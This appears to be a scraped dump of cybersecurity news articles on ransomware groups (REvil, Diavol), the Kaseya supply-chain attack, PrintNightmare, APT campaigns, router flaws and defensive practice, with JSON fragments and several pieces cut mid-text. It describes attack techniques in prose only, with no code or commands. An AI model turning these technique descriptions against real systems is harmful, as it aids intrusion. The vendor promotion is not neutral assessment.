classic examples of network scanners are Nessus and Qualys. Both are market leaders and provide a robust level of security and vulnerability coverage. A modern alternative that you could consider if you want a tool that is easy to get started with is Intruder.\nThis online vulnerability scanner has been specifically developed to be usable by non-security experts, while providing high-quality checks, as well as automatic scans for emerging threats.Intruder uses a unique algorithm to prioritize issues that leave your systems exposed, making it particularly easy to find out what presents the highest risk.\nWhat are the Benefits of Vulnerability Assessment?\nVulnerability assessment aims to automatically uncover as many security flaws as possible so these can be mitigated before threat actors can get to them. It also helps make penetration testing, which, in contrast, is a manual process, more efficient. In fact, as explained by the NCSC, “By taking care of the ’low hanging fruit’ through regular vulnerability scanning, penetration testing engagements can more efficiently focus on complicated security issues that are better suited to a human.“\nWhen to run a penetration test?\nPen testers mimic real-life cyber attackers, but unlike threat actors, they follow a predefined scope and do not abuse the organization’s assets and data. Compared to vulnerability scanning, they are much more likely to uncover complicated or high-impact business-layer weaknesses, such as manipulating product pricing, using a customer account to access another customer’s data, or pivoting from one initial weakness into full system control. The downside is that in comparison, it’s expensive, so when is the right time to run one?\nThink along the key timelines of the risk assessment above, for example, after your product is developed but before you start taking on real customer data. Or after you hold some non-sensitive customer data, but before you start holding salary or health-related information.\nOnce you’re up and running, penetration testing should be performed after major changes, such as altering your authentication system, releasing a major new feature; or after 6-12 months of small changes (as each one, in theory, could accidentally introduce a weakness).\nAgain this depends on your risk level; if you’re moving money around even as often as every three months would be advisable (or more!), but if you’re on the lower end of the risk spectrum, once every 12 months is a commonly accepted schedule.Penetration testing should be carried out before implementing major system changes or in regular intervals of 6-12 months.Several types of penetration testing exist. Penetration testing can look for security flaws in technology, such as in your external and internal networks as well as web applications. However, it can also find vulnerabilities in an organization’s human resources, such as in the case of social engineering.\nThe pen testing company you choose would depend on the type of assets you want to test, but other factors, such as certifications, price, and experience, should be considered as well.\nConclusion\nSecurity testing is a critical cybersecurity process that aims to detect vulnerabilities in systems, software, networks, and applications. Its most common forms are vulnerability assessment and penetration testing, but the goal is always to address security flaws before malicious actors can exploit them.\nKeep in mind that threat actors also perform routine security testing to look for any vulnerability they can abuse. One security flaw could be enough for them to launch large-scale cyber attacks. While this could be frightening, your company can stay better protected by performing cybersecurity tests regularly.\nImplementing this strategy can be challenging, as there is no one-size-fits-all security testing solution. Small businesses may also hesitate to invest in an intangible product, especially one they may not fully understand because of all the technical jargon. Nowadays, many tools offer free trials, which present a great opportunity for small businesses to find the right solution before committing to a bigger investment. \nIf you’re in need of a modern, easy-to-use security testing solution, Intruder offers a 30-day free trial of their vulnerability assessment platform.

'text': 'Threat actors behind the infamous TrickBot malware have been linked to a new ransomware strain named “Diavol,“ according to the latest research.\nDiavol and Conti ransomware payloads were deployed on different systems in a case of an unsuccessful attack targeting one of its customers earlier this month, researchers from Fortinet’s FortiGuard Labs said last week.\nTrickBot, a banking Trojan first detected in 2016, has been traditionally a Windows-based crimeware solution, employing different modules to perform a wide range of malicious activities on target networks, including credential theft and conduct ransomware attacks. \n\nDespite efforts by law enforcement to neutralize the bot network, the ever-evolving malware has proven to be a resilient threat, what with the Russia-based operators — dubbed “Wizard Spider“ — quickly adapting new tools to carry out further attacks.\n\nDiavol is said to have been deployed in the wild in one incident to date. The source of intrusion remains unknown as yet. What’s clear, though, is that the payload’s source code shares similarities with that of Conti, even as its ransom note has been found to reuse some language from Egregor ransomware.\n“As part of a rather unique encryption procedure, Diavol operates using user-mode Asynchronous Procedure Calls (APCs) without a symmetric encryption algorithm,“ the researchers said. “Usually, ransomware authors aim to complete the encryption operation in the shortest amount of time. Asymmetric encryption algorithms are not the obvious choice as they [are] significantly slower than symmetric algorithms.“\n\nAnother aspect of the ransomware that stands out is its reliance on an anti-analysis technique to obfuscate its code in the form of bitmap images, from where the routines are loaded into a buffer with execute permissions.\nPrior to locking files and changing the desktop wallpaper with a ransom message, some of the major functions carried out by Diavol include registering the victim device with a remote server, terminating running processes, finding local drives and files in the system to encrypt, and preventing recovery by deleting shadow copies.\n\nWizard Spider’s nascent ransomware effort also coincides with “new developments to the TrickBot webinject module,“ as detailed by Kryptos Logic Threat Intelligence team, indicating that the financially motivated cybercrime group is still actively retooling its malware arsenal.\n“TrickBot has brought back their bank fraud module, which has been updated to support Zeus-style webinjects,“ cybersecurity researcher Marcus Hutchins tweeted. “This could suggest they are resuming their bank fraud operation, and plan to expand access to those unfamiliar with their internal webinject format.“\n\n\nFound this article interesting?

{'title': 'REvil Used 0-Day in Kaseya Ransomware Attack, Demands $70 Million Ransom',
'text': 'Amidst the massive supply-chain ransomware attack that triggered an infection chain compromising thousands of businesses on Friday, new details have emerged about how the notorious Russia-linked REvil cybercrime gang may have pulled off the unprecedented hack.\nThe Dutch Institute for Vulnerability Disclosure (DIVD) on Sunday revealed it had alerted Kaseya to a number of zero-day vulnerabilities in its VSA software (CVE-2021-30116) that it said were being exploited as a conduit to deploy ransomware. The non-profit entity said the company was in the process of resolving the issues as part of a coordinated vulnerability disclosure when the July 2 attacks took place.\nMore specifics about the flaws were not shared, but DIVD chair Victor Gevers hinted that the zero-days are trivial to exploit. At least 1,000 businesses are said to have been affected by the attacks, with victims identified in no less than 17 countries, including the U.K., South Africa, Canada, Argentina, Mexico, Indonesia, New Zealand, and Kenya, according to ESET.\n\nKaseya VSA is a cloud-based IT management and remote monitoring solution for managed service providers (MSPs), offering a centralized console to monitor and manage endpoints, automate IT processes, deploy security patches, and control access via two-factor authentication.\nREvil Demands $70 Million Ransom\nActive since April 2019, REvil (aka Sodinokibi) is best known for extorting $11 million from the meat-processor JBS early last month, with the ransomware-as-a-service business accounting for about 4.6% of attacks on the public and private sectors in the first quarter of 2021.\n\nThe group is now asking for a record $70 million ransom payment to publish a universal decryptor that can unlock all systems that have been crippled by file-encrypting ransomware.\n“On Friday (02.07.2021) we launched an attack on MSP providers. More than a million systems were infected. If anyone wants to negotiate about universal decryptor – our price is 70,000,000$ in BTC and we will publish publicly decryptor that decrypts files of all victims, so everyone will be able to recover from attack in less than an hour,“ the REvil group posted on their dark web data leak site.\n\nKaseya, which has enlisted the help of FireEye to help with its investigation into the incident, said it intends to “bring our SaaS data centers back online on a one-by-one basis starting with our E.U., U.K., and Asia-Pacific data centers followed by our North American data centers.“\nOn-premises VSA servers will require the installation of a patch prior to a restart, the company noted, adding it’s in the process of readying the fix for release on July 5.\nCISA Issues Advisory\nThe development has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to issue an advisory, urging customers to download the Compromise Detection Tool that Kaseya has made available to identify any indicators of compromise (IoC), enable multi-factor authentication, limit communication with remote monitoring and management (RMM) capabilities to known IP address pairs, and place administrative interfaces of RMM behind a virtual private network (VPN) or a firewall on a dedicated administrative network.\n\n“Less than ten organizations [across our customer base] appear to have been affected, and the impact appears to have been restricted to systems running the Kaseya software,“ Barry Hensley, Chief Threat Intelligence Officer at Secureworks, told The Hacker News via email.\n“We have not seen evidence of the threat actors attempting to move laterally or propagate the ransomware through compromised networks. That means that organizations with wide Kaseya VSA deployments are likely to be significantly more affected than those that only run it on one or two servers.“\nBy compromising a software supplier to target MSPs, who, in turn, provide infrastructure or device-centric maintenance and support to other small and medium businesses, the development once again underscores the importance of securing the software supply chain, while also highlighting how hostile agents continue to advance their financial motives by combining the twin threats of supply chain attacks and ransomware to strike hundreds of victims at once.\n“MSPs are high-value targets — they have large attack surfaces, making them juicy targets to cybercriminals,“ said Kevin Reed, chief information security officer at Acronis. “One MSP can manage IT for dozens to a hundred companies: instead of compromising 100 different companies, the criminals only need to hack one MSP to get access to them all.“\n\n\nFound this article interesting?

{'title': 'Kaseya Supply-Chain Attack Hits Nearly 40 Service Providers With REvil Ransomware',
'text': 'Threat actors behind the notorious REvil cybercrime operation appear to have pushed ransomware via an update for Kaseya’s IT management software, hitting around 40 customers worldwide, in what’s an instance of a widespread supply-chain ransomware attack.\n“Beginning around mid-day (EST/US) on Friday, July 2, 2021, Kaseya’s Incident Response team learned of a potential security incident involving our VSA software,“ the company’s CEO Fred Voccola said in a statement shared late Friday.\n\nFollowing the incident, the IT and security management services company said it took immediate steps to shut down its SaaS servers as a precautionary measure, in addition to notifying its on-premises customers to shut down their VSA servers to prevent them from being compromised.\n\nVoccola also said the company has identified the source of the vulnerability and that it’s readying a patch to mitigate the ongoing issues. In the interim, the company also noted it intends to keep all on-premise VSA servers, SaaS, and hosted VSA servers shut down until it’s safe to resume operations.\nAccording to Sophos Malware Analyst Mark Loman, the industry-wide supply-chain attack leverages Kaseya VSA to deploy a variant of the REvil ransomware into a victim’s environment, with the malicious binary side-loaded via a fake Windows Defender app to encrypt files in return for a ransom demand of $5 million.\n\nThe attack chain also involves attempts to disable Microsoft Defender Real-Time Monitoring via PowerShell, Loman added. The trojanized software is being distributed in the form of a “Kaseya VSA Agent Hot-fix,“ Huntress Labs said in a Reddit post detailing the workings of the breach.\n\nThe researchers noted they had found eight managed service providers (MSPs), companies that provide IT services to other companies, that had been hit by the attack. About 200 businesses that are served by these MSPs have been locked out of parts of their network, Huntress Labs said.\nAs the ransomware crisis continues to spiral, MSPs have emerged as a lucrative target, mainly because a successful break-in opens up access to multiple clients, rendering them all vulnerable. With supply chain attacks becoming frequent in the wake of the sprawling SolarWinds campaign, a supply chain attack that targets MSPs to distribute ransomware has exponential consequences, enabling bad actors to strike hundreds of victims at once.\nUpdate: In a revised advisory shared on Saturday, Kaseya said it had been the “victim of a sophisticated cyberattack,“ while warning customers to refrain from clicking on any links sent in communications with the ransomware operators. “They may be weaponized,“ the company cautioned.\nBesides roping in cybersecurity firm FireEye Mandiant to identify the indicators of compromise (IoCs), the company is recommending businesses to keep all on-premises VSA servers offline until further notice and use a Compromise Detection Tool that it has made available to commence the recovery process.\nHuntress Labs said it’s tracking close to 30 MSPs across the U.S., Australia, European Union, EU, and Latin America, where Kaseya VSA was used to encrypt new fewer than 1,000 businesses.\n“All of these VSA servers are on-premises and Huntress assesses with high confidence that cybercriminals exploited a vulnerability to gain access into these servers,“ Huntress Labs researcher John Hammond said.\nThis raises the possibility that REvil used a zero-day flaw in Kaseya VSA software to gain access to the systems, making it the first time a ransomware group has used a zero-day in attacks. Kaseya, for its part, noted that it had isolated and replicated the attack vector, and that it’s working towards adding software remediations to address the security weakness.\n\n\n\nFound this article interesting?

Mirai_ptea is no exception.\n\nNot much has been disclosed about the security flaw in an attempt to prevent further exploitation, but the researchers said the KGUARD DVR firmware had vulnerable code prior to 2017 that enabled remote execution of system commands without authentication. At least approximately 3,000 devices exposed online are susceptible to the vulnerability.\n\nBesides using Tor Proxy to communicate with the command-and-control (C2) server, an analysis of the mirai_ptea sample revealed extensive encryption of all sensitive resource information, which is decoded to establish a connection with the C2 server and retrieve attack commands for execution, including launching DDoS attacks.\n“The geographic distribution of bot source IPs is [...] mainly concentrated in the United States, Korea and Brazil,“ the researchers noted, with infections reported across Europe, Asia, Australia, North and South America, and parts of Africa.\n\n\nFound this article interesting?

This legitimate version is dropped to the ’C:\Users\Public\’ folder and executed under a new process. This guarantees that the installer behaves as expected, meaning that a regular user is unlikely to notice anything suspicious.“\n\nThe modus operandi is also notable for the use of steganography to transfer shellcode to the victim machine, with the installer downloading a bitmap image (.BMP) file from a remote server to extract and deploy an encrypted Cobalt Strike beacon payload.\nMonPass was notified of the incident on April 22, after which the certificate authority took steps to address their compromised server and notify those who downloaded the backdoored client.\n\nThe incident marks the second time software provided by a certificate authority has been compromised to infect targets with malicious backdoors.

In November 2020, Microsoft disclosed credential harvesting activities staged by the adversary aimed at companies involved in researching vaccines and treatments for COVID-19.\nWhat’s different this time around is the actor’s reliance on software containers to scale its brute-force attacks.\n“The campaign uses a Kubernetes cluster in brute force access attempts against the enterprise and cloud environments of government and private sector targets worldwide,“ CISA said. “After obtaining credentials via brute force, the GTsSS uses a variety of known vulnerabilities for further network access via remote code execution and lateral movement.“\nSome of the other security flaws exploited by APT28 to pivot inside the breached organizations and gain access to internal email servers include -\nCVE-2020-0688 - Microsoft Exchange Validation Key Remote Code Execution VulnerabilityCVE-2020-17144 - Microsoft Exchange Remote Code Execution Vulnerability\nThe threat actor is also said to have utilized different evasion techniques in an attempt to disguise some components of their operations, including routing brute-force authentication attempts through Tor and commercial VPN services, such as CactusVPN, IPVanish, NordVPN, ProtonVPN, Surfshark, and WorldVPN.\n\nThe agencies said the attacks primarily focused on the U.S. and Europe, targeting government and military, defense contractors, energy companies, higher education, logistics companies, law firms, media companies, political consultants or political parties, and think tanks.\n“Network managers should adopt and expand usage of multi-factor authentication to help counter the effectiveness of this capability,“ the advisory noted. “Additional mitigations to ensure strong access controls include time-out and lock-out features, the mandatory use of strong passwords, implementation of a Zero Trust security model that uses additional attributes when determining access, and analytics to detect anomalous accesses.“\n\n\nFound this article interesting?

'text': 'Microsoft on Thursday officially confirmed that the “PrintNightmare“ remote code execution (RCE) vulnerability affecting Windows Print Spooler is different from the issue the company addressed as part of its Patch Tuesday update released earlier this month, while warning that it has detected exploitation attempts targeting the flaw.\nThe company is tracking the security weakness under the identifier CVE-2021-34527, and has assigned it a severity rating of 8.8 on the CVSS scoring system. All versions of Windows contain the vulnerable code and are susceptible to exploitation.\n\n“A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations,“ Microsoft said in its advisory. “An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.“\n“An attack must involve an authenticated user calling RpcAddPrinterDriverEx(),“ the Redmond-based firm added. When reached by The Hacker News, the company said it had nothing to share beyond the advisory.\nThe acknowledgment comes after researchers from Hong Kong-based cybersecurity company Sangfor published a technical deep-dive of a Print Spooler RCE flaw to GitHub, along with a fully working PoC code, before it was taken down just hours after it went up.\n\nThe disclosures also set off speculation and debate about whether the June patch does or does not protect against the RCE vulnerability, with the CERT Coordination Center noting that “while Microsoft has released an update for CVE-2021-1675, it is important to realize that this update does NOT protect Active Directory domain controllers, or systems that have Point and Print configured with the NoWarningNoElevationOnInstall option configured.“\n\nCVE-2021-1675, originally classified as an elevation of privilege vulnerability and later revised to RCE, was remediated by Microsoft on June 8, 2021.\nThe company, in its advisory, noted that PrintNightmare is distinct from CVE-2021-1675 for reasons that the latter resolves a separate vulnerability in RpcAddPrinterDriverEx() and that the attack vector is different.\nAs workarounds, Microsoft is recommending users to disable the Print Spooler service or turn off inbound remote printing through Group Policy.

{'title': 'IndigoZebra APT Hacking Campaign Targets the Afghan Government',
'text': 'Cybersecurity researchers are warning of ongoing attacks coordinated by a suspected Chinese-speaking threat actor targeting the Afghanistan government as part of an espionage campaign that may have had its provenance as far back as 2014.\nIsraeli cybersecurity firm Check Point Research attributed the intrusions to a hacking group tracked under the moniker “IndigoZebra,“ with past activity aimed at other central-Asian countries, including Kyrgyzstan and Uzbekistan.\n“The threat actors behind the espionage leveraged Dropbox, the popular cloud-storage service, to infiltrate the Afghan National Security Council (NSC),“ the researchers said in a technical write-up shared with The Hacker News, adding they “orchestrated a ministry-to-ministry style deception, where an email is sent to a high-profile target from the mailboxes of another high-profile victim.“\n\nIndigoZebra first came to light in August 2017 when Kaspersky detailed a covert operation that singled out former Soviet Republics with a wide swath of malware such as Meterpreter, Poison Ivy RAT, xDown, and a previously undocumented piece of malware called xCaon.\nCheck Point’s investigation into the attacks commenced in April when NSC officials began receiving lure emails allegedly claiming to be from the Administrative Office of the President of Afghanistan.\n\nWhile the message urged the recipients to review modifications in an attached document related to a pending NSC press conference, opening the decoy file — a password-protected RAR archive (“NSC Press conference.rar“) — was found to trigger an infection chain that culminated in the installation of a backdoor (“spools.exe“) on the targeted system.\nAdditionally, the attacks funneled malicious commands into the victim machine that were camouflaged using the Dropbox API, with the implant creating a unique folder for every compromised host in an attacker-controlled Dropbox account.\nThe backdoor, dubbed “BoxCaon,“ is capable of stealing confidential data stored on the device, running arbitrary commands, and exfiltrating the results back to the Dropbox folder. The commands (“c.txt“) themselves are placed in a separate sub-folder named “d“ in the victim’s Dropbox folder, which is retrieved by the malware prior to execution.\n\nBoxCaon’s connection to IndigoZebra stems from similarities shared by the malware with xCaon. Check Point said it identified about 30 different samples of xCaon — the earliest dating back to 2014 — all of which rely on HTTP protocol for command-and-control communications.\nTelemetry data analyzed by the researchers also found that the HTTP variants primarily set their sights on political entities located in Kyrgyzstan and Uzbekistan, suggesting a shift in targeting in recent years along with a revamped toolset.\n“What is remarkable here is how the threat actors utilized the tactic of ministry-to-ministry deception,“ said Lotem Finkelsteen, head of threat intelligence at Check Point.\n“This tactic is vicious and effective in making anyone do anything for you; and in this case, the malicious activity was seen at the highest levels of sovereignty. Furthermore, it’s noteworthy how the threat actors utilize Dropbox to mask themselves from detection.“\n\n\nFound this article interesting?

{'title': 'Rethinking Application Security in the API-First Era',
'text': 'Securing applications it the API-first era can be an uphill battle. As development accelerates, accountability becomes unclear, and getting controls to operate becomes a challenge in itself. It’s time that we rethink our application security strategies to reflect new priorities, principles and processes in the API-first era. Securing tomorrow’s applications begins with assessing the business risks today.\nThe trends and risks shaping today’s applications\nAs the world continues to become more and more interconnected via devices — and the APIs that connect them — individuals are growing accustomed to the frictionless experience that they provide. While this frictionless reality is doubtlessly more user-friendly, i.e., faster and more convenient, it also requires a trade-off. This convenience demands openness, and openness is a risk when it comes to cybersecurity.\nAccording to Sidney Gottesman, Mastercard’s SVP for Security Innovation, the above situation leads to one of the biggest trends shaping the security posture for today’s applications: A crisis of trust between individuals and the applications they use. \nA second major trend is that of the supply chain. Simply handling your own risks isn’t enough, as attacks increasingly penetrate internal systems via 3rd party, vendor-supplied components. In digital products and even connected hardware products, supply chains are now composed of different services bundled together in the final product through APIs, creating a new type of integration risk rooted in the supply chain. \n\nIf the recent Colonial Pipeline and JBS attacks indicate anything, it’s that another major trend is the abundance of malicious actors, both at the individual and state level. Businesses must now assume that sooner, rather than later, they will be attacked and must be prepared. \nAbundance of data can not be ignored. Enterprises are storing, managing, and enabling access to so much data, making the application layer (and APIs) more attractive to attackers. Increasing regulations aimed at improving the security postures of both public and private enterprises also get a special spot in the landscape of security trends. \nApplication security isn’t what it used to be\n80% of enterprises currently allow external access to data and functionality via APIs, according to a recent industry survey published by Imvision, looking into the current state of API use and adoption among leading enterprises. The results are in line with other research on the topic and conclude that enterprises are much more open than they used to be just a few years back - and growing.\nBut this means that application security has moved beyond its “doorman“ status of asking “who’s allowed in?“ Nowadays, application security should assume that users are already inside the application and focus on asking, “what do we allow them to do?“, “what’s the expected usage?“ and “how do we stop undesirable behavior?“. \n\nAccording to Rob Cuddy, the Global Application Security Evangelist at HCL, the fundamental shift enterprises must make in their approach to application security is that securing the application perimeter from external penetration simply doesn’t make sense in the era of APIs. \nBuilding layers of security around the application won’t work when the application is exposed via APIs. Instead, a new inside-out approach is required. This new approach assumes application penetration in service of the user, but puts protective mechanisms in place in case that the actor is malicious. \nLearn more on how security professionals are rethinking application security \nIf you ask developers, they’d tell you that security was there all along, but now it’s become critical. However, it’s not an issue of adding new tools or automations, but rather a matter of making a fundamental shift in people, processes, and culture.\nIn the race for superfast agile deliveries, many enterprises are adopting a DevSecOps approach that mandates the integration of security practices within the development lifecycle. But while many are talking about doing it, only about half are actually doing something about it - meaning, actually having a full lifecycle API security in place. \nManaging security among disparate teams is no easy task\nAt Allegiant Airlines, Chief Information Security Officer Rob Hornbuckle is leading an interesting initiative to improve awareness, visibility, and collaboration across teams and the development lifecycle. \nTo develop and maintain their customer-facing applications, they have 10 persistent development teams at any given time. However, orchestrating security among disparate teams is no walk in the park. It requires substantial visibility and a culture shift that encourages initiative and responsibility-taking.\nTo keep security at the forefront, they established a security champion program that puts two people on every team with the responsibility for ensuring certain security standards during development. These champions help the rest of the team drive knowledge and communication throughout the entire system. \nThis program empowers visibility into application security at the organizational level via monthly meetings that focus on everything that’s happening with security within the different application programming groups. These meetings enable the organization to provide metrics regarding the overall security health achieved by different teams overtime to help gain buy-in from senior executives and board members.\nVisibility, or: “Being able to identify what needs to be fixed first“\nWith many enterprises using dozens, if not hundreds or more, different security tools addressing different systems, CISOs are challenged to understand what is of critical importance, so they can effectively prioritize vulnerabilities to mitigate risk. \nBut just because a server is unpatched doesn’t necessarily mean that it poses a true business risk. What’s required is not only visibility into vulnerabilities, but rather into the exposure it creates and the potential business impact in case of a breach. \nTo truly be able to associate the business risk with a vulnerability, Rob Hornbuckle believes that executive management needs both a solid understanding of application programming, as well as formidable knowledge of the inner workings of an organization’s business model. This enables them to prioritize mitigation in accordance with the true business impact of a potential breach on their unique business model. \nEven if a specific vulnerability was able to disrupt operations at Colonial Pipeline, for example, it doesn’t mean that that same vulnerability holds any risk to another organization’s bottom line, especially if their business model is different. The most important assets to protect are those services and applications that expose critical business functions.\nDeveloping a view of application risks within the context of enterprise risk management\nRallying the organization around security is no easy task, especially when their input - as valuable and important as may be - often creates delays and adds work to harried development teams. Ensuring that all levels of the organization understand the importance of the security team is a critical step in implementing secure development processes.\nAt BNP Paribas, the Global Head of Technology Risk Intelligence Sandip Wadje points out that making it easy for the organization to understand just how big their internal and external attack surfaces are and exactly which critical business functions are exposed, is paramount. \nThe first step is discovery - knowing what you have, how it’s used, why it exists. While this step is pretty straightforward, in the second step, governance, enterprises should seek to understand which steps they’re taking in terms of application development, maintenance and ongoing monitoring. Organizations must ensure that they have either a centralized governance committee or a 3rd party technology risk team to oversee internal organization security measures. \nThe third stage is that of assurance regarding ongoing security measures. Ongoing security monitoring that continuously analyzes new vulnerabilities as they’re discovered significantly reduces risks, as exploited vulnerabilities are often those that weren’t known to the organization. \nFinally, resilience is another key capability to develop. Putting in place concrete procedures for incident response and reducing exposure is essential in the case that vulnerabilities have been exploited. As many organizations are already using different security solutions, ensuring effective use of these solutions in protecting critical business applications is key. \nLearn more on how to make your security team a necessity in the API-first era.\nTake this example: at BNP Paribas, the security team created a blueprint of different applications to understand how each one was impacted by the transition to the cloud. This blueprint is used by executive management to empower a view of the different workloads that could be safely migrated to the cloud. \nThey then created governance around it, both at the corporate group level, which focused on strategy, and at the operational level, which focused on ongoing monitoring assurance. Their next step was to create an API steering committee to prioritize services in terms of their ability to monetize data. Finally, they set up a 3rd party risk management program and included important internal stakeholders to develop their application security strategy. \nThe surprising upside of security regulations\nMuch like individuals, teams also have a reputation. For security teams, it is highly important to ensure that over time they aren’t viewed as a nuisance getting in the way of speedy deliveries but rather as a business enabler. This is where regulations can actually go a long way in ensuring that this isn’t the case. \nBy conditioning the launch of new initiatives on adherence to security, safety, and compliance measures, security teams become a necessity. Once security teams clearly draw lines between regulations, the vulnerabilities they discover, and the business impact, development teams will stop seeing them as a nuisance. \n\nThis elevates security to a strategic business enabler and even a competitive differentiator.\nAt Mastercard, for example, under the leadership of a CEO that has been focused on security from the get go, their corporate security team is at the heart of their business model and provides security services to all of their customers and to the ecosystem at large. \nSummary\nIn the API-era, organizations must rethink their security posture. Trends like the crisis of confidence, supply chain interconnectedness, regulations, and the increasing number of malicious actors dictate the shift to an inside-out approach in terms of cybersecurity. \nWith more and more enterprises allowing users to access data and functionality through APIs, the security perspective must change from restricting access to better controls and permissions. \nTo get started, organizations must first ensure clear visibility of vulnerabilities and the ability to prioritize according to business impact. Ensuring that the entire organization understands the threats and risks posed to their critical business processes is also key. \nEstablishing formal processes, including discovery, assurance, ongoing monitoring, and resilience, and finally, changing the view of security teams from a nuisance to a necessity is critical to shipping secure products. \n*** This article is based on the first session of the executive education program by Imvision.\n\n\nFound this article interesting?

{'title': '3 Steps to Strengthen Your Ransomware Defenses',
'text': 'The recent tsunami of ransomware has brought to life the fears of downtime and data loss cybersecurity pros have warned about, as attacks on the energy sector, food supply chain, healthcare industry, and other critical infrastructure have grabbed headlines.\nFor the industry experts who track the evolution of this threat, the increased frequency, sophistication, and destructiveness of ransomware suggests that businesses still have some major gaps in their defense strategies.\nIt’s no surprise that a new, multi-layered approach to protection is needed to stem the damage caused by ransomware. But what changes should an IT team implement to close those gaps?\nDuring a recent panel, a team of cybersecurity experts outlined a three-step plan to do just that -- centered around embracing new technologies, improving security processes, and ensuring their people know how to help curb the threat.\n1 — New Strains Overwhelm Old Defenses\nMany new ransomware strains now act like advanced persistent threats (APTs), laying dormant in the corporate network for weeks, quietly gathering information and stealing data.\nThis trend is why some analysts predict data exfiltration will overtake encryption as the preferred approach of ransomware attackers.\nDespite their change in approach, attackers still rely on familiar techniques early in these attacks, such as phishing to steal credentials and inject malware. In fact, Topher Tebow, senior cybersecurity researcher at Acronis, says that 94% of successful malware attacks now begin with phishing.\nTo deny attackers entry, he advises organizations to update their email security and deploy URL filtering if they had not already done so. These defensive layers can block phishing emails from reaching a user’s inbox and prevent a malware payload from infecting the system. Simple tech investments like these, Tebow notes, can be an easy, effective way to end a ransomware attack before it starts.\nDylan Pollock, a senior network engineer at NASCAR’s Hendrik Motorsports, adds that attackers also love to target known vulnerabilities that remain unpatched in order to target operating systems, applications, and devices. Unpatched vulnerabilities “are like catnip to cybercriminals,“ which is why he recommends organizations consider adopting tools that can automate vulnerability scanning and patch management efforts.\nOrganizations cannot continue to rely solely on signature-based defenses to stop cyber threats.\nThat’s because, as Acronis VP of Cyber Protection Research Candid Wüest points out, cybercriminals are creating new versions of ransomware every day. That means each new attack is a zero-day threat that traditional signature-based defenses will miss.\nWüest says what organizations need is more adaptive defenses that use behavioral-based detection to identify and stop threats. Solutions powered by machine intelligence – the next stage of artificial intelligence and machine learning – that are adept at recognizing new patterns of attack behavior and automatically respond in real-time to mitigate the attack.\n2 — Better Processes Stop Ransomware\nWhile using modern solutions to defeat modern threats is critical, upgraded defenses alone are not enough in a world where ransomware is considered an inevitability by experts. The procedures organizations use to safeguard their data need to address that reality. “It cannot be overstated how important a well-thought-out and religiously executed backup program is as a final line of defense,“ warns Graham Cluley.\nA cybercrime researcher and host of the Smashing Security podcast, Cluley quickly adds that backups alone are not enough. Regular testing of those backups is required to ensure they enable an organization to restore quickly after an attack – otherwise, the company may end up paying the ransom anyway.\nWhen it comes to examining processes, Wüest adds that organizations need to lock down all of the operational software used in their environment. That’s because ransomware attackers increasingly are using a “living off the land“ strategy, where they hijack common tools such as RDP and Mimikatz to steal passwords, escalate privileges, and take control of remote desktop tools.\nThat makes stealing and encrypting data much easier. He recommends that in addition to restricting elevated privileges, companies should enforce rigorous password procedures such as multi-factor authentication.\n3 — People Aware of Ransomware Avoid It\nCombatting ransomware falls down, though, if people aren’t involved in protecting the company. Security awareness training is as vital to endpoint security as is defensive technology. Just training end-users to recognize and avoid social engineering attempts could go a long way to preventing an attack from succeeding, advises Pollock.\n“If we could get users to think just two more seconds before they click on a suspicious email, many ransomware attacks would never get a toehold in our businesses,“ he noted. \nSecurity teams have successfully adapted to combat ransomware, but Cluley cautioned against letting up on the gas. Cybercriminals continue to modify and advance their attacks, so organizations must constantly improve as well – deploying multiple layers of protection, ensuring security awareness, and testing their incident response plan. Then, he said, “you’ll have a fighting chance.“\nHear these cybersecurity experts’ full recommendations in the recording of their Acronis virtual conference panel, “See Inside a Live Ransomware Attack, Then Learn How to Prevent All of Them.“\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have detailed critical security vulnerabilities affecting NETGEAR DGN2200v1 series routers, which they say could be reliably abused as a jumping-off point to compromise a network’s security and gain unfettered access.\nThe three HTTPd authentication security weaknesses (CVSS scores: 7.1 – 9.4) impact routers running firmware versions prior to v1.0.0.60, and have since been fixed by the company in December 2020 as part of a coordinated vulnerability disclosure process.\n\n“The rising number of firmware attacks and ransomware attacks via VPN devices and other internet-facing systems are examples of attacks initiated outside and below the operating system layer,“ Microsoft 365 Defender Research Team’s Jonathan Bar Or said. “As these types of attacks become more common, users must look to secure even the single-purpose software that run their hardware—like routers.“\n\nIn a nutshell, the flaws allow accessing router management pages using an authentication bypass, enabling an attacker to gain complete control over the router, as well as derive saved router credentials via a cryptographic side-channel attack, and even recover the username and the password stored in the router’s memory by exploiting the configuration backup\restore feature.\n\n“The username and the password are compared [against the saved credentials] using strcmp,“ Bar Or explained. “The libc implementation of strcmp works by comparing character-by-character until a NUL terminator is observed or until a mismatch happens. An attacker could take advantage of the latter by measuring the time it takes to get a failure.“\n\nFurthermore, by abusing the aforementioned authentication bypass to fetch the configuration file, the researchers found that the credentials were encrypted using a constant key, which can be subsequently used to retrieve the plaintext password and the user name.\nNETGEAR DGN2200v1 users are recommended to download and update to the latest firmware to fend off any potential attacks.\n\n\nFound this article interesting?

'text': 'Colombian authorities on Wednesday said they have arrested a Romanian hacker who is wanted in the U.S. for distributing a virus that infected more than a million computers from 2007 to 2012.\nMihai Ionut Paunescu (aka “Virus“), the individual in question, was detained at the El Dorado airport in Bogotá, the Office of the Attorney General of Colombia said.\n\nPaunescu was previously charged by the U.S. Department of Justice (DoJ) in January 2013 for operating a bulletproof hosting service that “enabled cyber criminals to distribute the Gozi Virus, the Zeus Trojan and other notorious malware, and conduct other sophisticated cyber crimes.“ He was arrested in Romania in December 2012 but managed to avoid extradition to the U.S.\n“Through this service, Paunescu, like other bulletproof hosts, knowingly provided critical online infrastructure to cyber criminals that allowed them to commit online criminal activity with little fear of detection by law enforcement,“ the DoJ said in an unsealed indictment.\n\nGozi (aka ISFB, Snifula, or Ursnif), a Windows-based banking trojan, had its roots dating as far back as 2005 prior to its deployment in real-world attacks in 2007. At least 40,000 computers in the U.S., including those belonging to the National Aeronautics and Space Administration (NASA), are said to have been infected with the virus.\nGermany, Great Britain, Poland, France, Finland, Italy, and Turkey are the other countries where Gozi infections were reported.\n\nIn May 2016, Gozi’s primary developer, a Russian citizen named Nikita Kuzmin, was sentenced to 37 months in prison and fined $7 million over charges of computer intrusion and fraud, and for causing “tens of millions of dollars in losses“ to individuals, businesses, and government entities. Kuzmin also rented out the malware to other criminal operators in exchange for $500 a week.\n\nSeparately, Deniss Calovskis, a Latvian national who developed “web 